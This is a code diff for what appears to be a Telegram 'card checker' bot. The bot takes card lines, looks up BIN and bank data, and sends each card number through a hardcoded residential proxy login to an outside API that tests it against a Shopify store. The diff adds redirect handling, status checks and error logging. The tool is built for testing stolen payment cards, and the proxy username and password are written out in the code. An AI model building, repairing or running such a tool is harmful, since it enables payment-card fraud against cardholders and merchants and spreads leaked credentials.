@@ -355,8 +355,6 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
         site_url = "https://ripnroll.com"
-        
-        # Original Proxy Setup restored
         proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1-country-in-state-jammu-and-kashmir:sxf92a7e5g32@brd.superproxy.io:33335"
         
         api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
@@ -366,8 +364,10 @@ async def process_card_string(card_line, user_full_name):
             "https://": f"http://{proxy_val}"
         }
         
-        async with httpx.AsyncClient(proxies=proxies, timeout=30.0) as client:
+        async with httpx.AsyncClient(proxies=proxies, timeout=30.0, follow_redirects=True) as client:
             response = await client.get(api_url)
+            if response.status_code != 200:
+                return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
             res_data = response.json()
         
         resp_status = res_data.get("Response", "UNKNOWN")
@@ -390,7 +390,7 @@ async def process_card_string(card_line, user_full_name):
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
             f"𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -401,6 +401,7 @@ async def process_card_string(card_line, user_full_name):
     except httpx.TimeoutException:
         return f"❌ {card_line} ➔ API Timeout (Server took too long)"
     except Exception as e:
+        logger.error(f"Processing error: {str(e)}")
         return f"❌ {card_line} ➔ API Error / Connection Failed"
 
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -507,9 +508,9 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with original proxy...")
+    print("Bot is up and running...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-        
+            
